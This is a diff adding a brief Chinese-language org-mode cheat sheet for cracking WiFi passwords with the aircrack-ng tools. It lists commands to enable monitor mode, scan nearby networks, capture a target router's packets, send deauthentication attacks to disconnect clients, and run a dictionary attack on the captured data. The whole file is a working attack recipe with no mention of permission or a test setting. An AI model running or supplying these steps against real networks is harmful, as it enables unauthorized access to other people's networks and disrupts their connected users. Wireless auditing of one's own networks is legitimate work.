@@ -1,0 +1,28 @@
+* 1. 准备
+** ifconfig -a ;;查看所有网卡信息
+** ifconfig wlan0 up ;;激活无线网卡
+** iwconfig ;;查看无线信息
+
+* 2. 监听
+** airmon-ng start wlan0 ;;监听无线网卡
+** iwconfig ;;查看无线网卡名称
+
+* 3. 扫描
+** airodump-ng wlan0mon ;;扫描周围WIFI信息
+
+* 4. 抓包
+** airodump-ng --ivs --bssid 路由器BSSID(mac) -w 数据包目标文件 -c WIFI频道 wlan0mon
+*** --ivs 过滤数据包
+
+* 5. 攻击
+** aireplay-ng -0 1 -a 路由器MAC -c 客户端MAC wlan0mon
+*** -0 攻击模式
+*** 1 攻击次数
+
+* 6. 破解
+** aircrack-ng -w 强大的字典 抓取的数据包文件
+
+* 7. 关闭网卡监听
+** airmon-ng stop wlan0mon
+
+
